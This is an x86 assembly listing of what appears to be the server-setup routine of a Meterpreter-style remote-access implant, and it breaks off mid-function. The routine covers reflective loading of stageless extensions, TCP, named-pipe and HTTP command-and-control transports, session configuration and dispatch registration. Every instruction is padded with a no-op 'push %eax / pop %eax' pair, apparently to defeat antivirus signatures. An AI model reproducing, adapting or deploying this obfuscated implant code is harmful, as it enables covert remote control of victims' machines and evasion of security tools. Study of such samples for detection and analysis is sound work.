	.file	"server_setup.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___time32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_exceptionfilter
	.def	_exceptionfilter;	.scl	2;	.type	32;	.endef
_exceptionfilter:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	movl	$1, %eax
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC0:
	.ascii "kernel32.dll\0"
LC1:
	.ascii "ProcessIdToSessionId\0"
	.text
	.globl	_server_sessionid
	.def	_server_sessionid;	.scl	2;	.type	32;	.endef
_server_sessionid:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$36, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	_processIdToSessionId.83551, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L6
push %eax
pop %eax
	movl	$LC0, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L6
push %eax
pop %eax
	movl	$LC1, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, _processIdToSessionId.83551
push %eax
pop %eax
L6:
	movl	_processIdToSessionId.83551, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L11
push %eax
pop %eax
	movl	_processIdToSessionId.83551, %ebx
push %eax
pop %eax
	movl	__imp__GetCurrentProcessId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	*%ebx
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L8
push %eax
pop %eax
	movl	$-1, -16(%ebp)
push %eax
pop %eax
	jmp	L8
push %eax
pop %eax
L11:
	nop
push %eax
pop %eax
L8:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L9
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__FreeLibrary@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L9:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_load_stageless_extensions
	.def	_load_stageless_extensions;	.scl	2;	.type	32;	.endef
_load_stageless_extensions:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$72, %esp
push %eax
pop %eax
	jmp	L13
push %eax
pop %eax
L14:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	addl	$4, %edx
push %eax
pop %eax
	movl	$1, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_LoadLibraryR@12
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	_extensionCommands, %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_load_extension
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	leal	4(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, 12(%ebp)
push %eax
pop %eax
L13:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L14
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L15
push %eax
pop %eax
L16:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$8, -24(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_stagelessinit_extension
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
L15:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L16
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 2
LC2:
	.ascii "t\0c\0p\0\0\0"
	.align 2
LC3:
	.ascii "p\0i\0p\0e\0\0\0"
	.text
	.def	_create_transport;	.scl	3;	.type	32;	.endef
_create_transport:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$3, 8(%esp)
push %eax
pop %eax
	movl	$LC2, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_wcsncmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L19
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_create_tcp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L20
push %eax
pop %eax
L19:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	$LC3, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_wcsncmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L21
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_create_named_pipe
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L20
push %eax
pop %eax
L21:
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_create_http
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
L20:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	jne	L22
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L23
push %eax
pop %eax
L22:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L24
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	72(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L24:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	72(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	72(%eax), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
L25:
	movl	-12(%ebp), %eax
push %eax
pop %eax
L23:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_append_transport;	.scl	3;	.type	32;	.endef
_append_transport:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L27
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	72(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	jmp	L29
push %eax
pop %eax
L27:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	72(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	72(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
L29:
	nop
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_remove_transport;	.scl	3;	.type	32;	.endef
_remove_transport:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	68(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	jne	L31
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 4(%eax)
push %eax
pop %eax
	jmp	L32
push %eax
pop %eax
L31:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 12(%ebp)
push %eax
pop %eax
	jne	L33
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	68(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
L33:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	72(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	68(%edx), %edx
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	68(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	72(%edx), %edx
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
L32:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_create_transports;	.scl	3;	.type	32;	.endef
_create_transports:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	jmp	L35
push %eax
pop %eax
L38:
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_create_transport
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L36
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -16(%ebp)
push %eax
pop %eax
	jmp	L35
push %eax
pop %eax
L36:
	movl	$0, %eax
push %eax
pop %eax
	jmp	L37
push %eax
pop %eax
L35:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	testw	%ax, %ax
push %eax
pop %eax
	jne	L38
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leal	2(%eax), %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	$1, %eax
push %eax
pop %eax
L37:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_config_create;	.scl	3;	.type	32;	.endef
_config_create:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$52, %esp
push %eax
pop %eax
	movl	$48, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	jne	L40
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	addl	$16, %eax
push %eax
pop %eax
	jmp	L41
push %eax
pop %eax
L40:
	movl	12(%ebp), %eax
push %eax
pop %eax
L41:
	movl	-16(%ebp), %edx
push %eax
pop %eax
	addl	$16, %edx
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	leal	32(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	addl	$32, %eax
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	72(%eax), %ebx
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	subl	%eax, %ebx
push %eax
pop %eax
	movl	%ebx, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 12(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$170532320, 8(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
L47:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_realloc
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	cmpl	-24(%ebp), %eax
push %eax
pop %eax
	jne	L42
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L42
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, (%edx)
push %eax
pop %eax
L42:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$8, %eax
push %eax
pop %eax
	je	L43
push %eax
pop %eax
	cmpl	$8, %eax
push %eax
pop %eax
	ja	L44
push %eax
pop %eax
	cmpl	$6, %eax
push %eax
pop %eax
	je	L45
push %eax
pop %eax
	cmpl	$6, %eax
push %eax
pop %eax
	ja	L44
push %eax
pop %eax
	cmpl	$1, %eax
push %eax
pop %eax
	je	L46
push %eax
pop %eax
	cmpl	$2, %eax
push %eax
pop %eax
	je	L45
push %eax
pop %eax
	jmp	L44
push %eax
pop %eax
L46:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_write_tcp_config
push %eax
pop %eax
	jmp	L44
push %eax
pop %eax
L43:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_write_named_pipe_config
push %eax
pop %eax
	jmp	L44
push %eax
pop %eax
L45:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_transport_write_http_config
push %eax
pop %eax
	nop
push %eax
pop %eax
L44:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	68(%eax), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	cmpl	-24(%ebp), %eax
push %eax
pop %eax
	jne	L47
push %eax
pop %eax
	movl	$10, -36(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_realloc
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$255, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	leal	-4(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %ecx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	nop
push %eax
pop %eax
	addl	$52, %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_server_setup
	.def	_server_setup;	.scl	2;	.type	32;	.endef
_server_setup:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$576, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -288(%ebp)
push %eax
pop %eax
	leal	-284(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$63, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	movl	$0, -544(%ebp)
push %eax
pop %eax
	leal	-540(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$63, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	call	_disable_thread_error_reporting
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_time
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_srand
push %eax
pop %eax
	call	_thread_open
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	call	_remote_allocate
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L49
push %eax
pop %eax
	movl	$8, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L49:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 68(%eax)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 76(%edx)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	76(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 72(%eax)
push %eax
pop %eax
	movl	$0, -548(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	48(%eax), %edx
push %eax
pop %eax
	leal	-548(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_create_transports
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L51
push %eax
pop %eax
	movl	$160, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L51:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L52
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	(%edx), %ecx
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	4(%edx), %edx
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L52:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$_create_transport, 60(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$_remove_transport, 64(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$_config_create, (%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 24(%eax)
push %eax
pop %eax
	call	_register_dispatch_routines
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	48(%eax), %edx
